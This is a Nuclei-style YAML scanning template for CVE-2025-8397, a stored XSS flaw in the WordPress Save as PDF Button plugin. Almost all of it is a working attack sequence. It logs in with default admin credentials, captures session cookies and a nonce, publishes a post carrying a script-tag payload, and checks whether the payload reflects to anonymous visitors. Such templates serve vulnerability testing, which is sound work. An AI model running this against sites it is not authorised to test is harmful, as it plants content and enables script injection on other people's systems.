id: cve-2025-8397-save-as-pdf-button-xss
info:
  name: WordPress Save as PDF Button - Stored XSS via restpackpdfbutton shortcode (CVE-2025-8397)
  author: Nikhil Patidar
  severity: medium
  description: |
    Detects Save as PDF Button plugin, optionally logs in, creates a post containing an XSS payload,
    then verifies reflection as an unauthenticated user. Use -var to provide admin creds.
  reference:
    - https://www.cve.org/CVERecord?id=CVE-2025-8397
  tags:
    - wordpress
    - cve
    - plugin
    - xss
variables:
  username: "admin"
  password: "password"
  # harmless PoC payload â€” change to the exact PoC you want to use
  xss_payload: '<script>alert("XSS")</script>'

requests:
  - id: login-page
    method: GET
    path:
      - "{{BaseURL}}/wp-login.php"
    matchers-condition: and
    matchers:
      - type: status
        part: header
        status:
          - 200
    extractors:
      - type: regex
        part: header
        # capture optional wordpress_test_cookie if set
        regex:
          - "(?i)set-cookie:\\s*(wordpress_test_cookie=[^;\\n]+)"
      - type: regex
        part: header
        # capture any existing wordpress_* cookie returned on GET (rare)
        regex:
          - "(?i)set-cookie:\\s*(wordpress_[^=]+=[^;\\n]+)"

  - id: login-post
    method: POST
    path:
      - "{{BaseURL}}/wp-login.php"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
      Cookie: "{{login-page.wordpress_test_cookie}}"
    body: "log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to={{BaseURL}}/wp-admin/&testcookie=1"
    redirects: true
    matchers-condition: or
    matchers:
      - type: status
        part: header
        status:
          - 302
      - type: regex
        part: header
        regex:
          - "(?i)set-cookie:\\s*wordpress_logged_in_[^=]+=([^;\\n]+)"
    extractors:
      - type: regex
        part: header
        regex:
          - "(?i)set-cookie:\\s*(wordpress_logged_in_[^=]+=[^;\\n]+)"

  - id: fetch-new-post
    method: GET
    path:
      - "{{BaseURL}}/wp-admin/post-new.php"
    headers:
      Cookie: "{{login-post.wordpress_logged_in}}"
    matchers-condition: and
    matchers:
      - type: status
        part: header
        status:
          - 200
    extractors:
      - type: regex
        part: body
        regex:
          - 'name="_wpnonce" value="([A-Za-z0-9_\-]+)"'
      - type: regex
        part: body
        regex:
          - 'name="post_type" value="([^"]+)"'

  - id: create-post
    method: POST
    path:
      - "{{BaseURL}}/wp-admin/post.php"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
      Cookie: "{{login-post.wordpress_logged_in}}"
      Referer: "{{BaseURL}}/wp-admin/post-new.php"
    body: 'post_title=XSS+From+Nuclei&content={{xss_payload}}&action=editpost&post_type={{fetch-new-post.post_type}}&_wpnonce={{fetch-new-post._wpnonce}}&_wp_http_referer=/wp-admin/post-new.php&post_status=publish'
    redirects: true
    matchers-condition: or
    matchers:
      - type: status
        part: header
        status:
          - 200
          - 302
    extractors:
      - type: regex
        part: header
        regex:
          - 'post=([0-9]+)'
      - type: regex
        part: body
        regex:
          - 'name="post_ID" value="([0-9]+)"'

  - id: check-unauth
    method: GET
    path:
      - "{{BaseURL}}/?p={{create-post.post_id}}"
      - "{{BaseURL}}/index.php?p={{create-post.post_id}}"
    matchers-condition: or
    matchers:
      - type: regex
        part: body
        # escaped payload match for the variable above
        regex:
          - '<script>alert\\("XSS"\\)</script>'
      - type: word
        part: body
        words:
          - 'alert("XSS")'

  - id: detect-plugin
    method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/save-as-pdf/readme.txt"
      - "{{BaseURL}}/wp-content/plugins/save-as-pdf/save-as-pdf.php"
      - "{{BaseURL}}/wp-content/plugins/save-as-pdf.php"
      - "{{BaseURL}}/"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "Save as PDF Button"
          - "restpackpdfbutton"
          - "Restpack Inc"
      - type: regex
        part: body
        regex:
          - "add_shortcode\\(\\s*['\\\"]restpackpdfbutton['\\\"]\\s*,"
          - "Save as PDF"
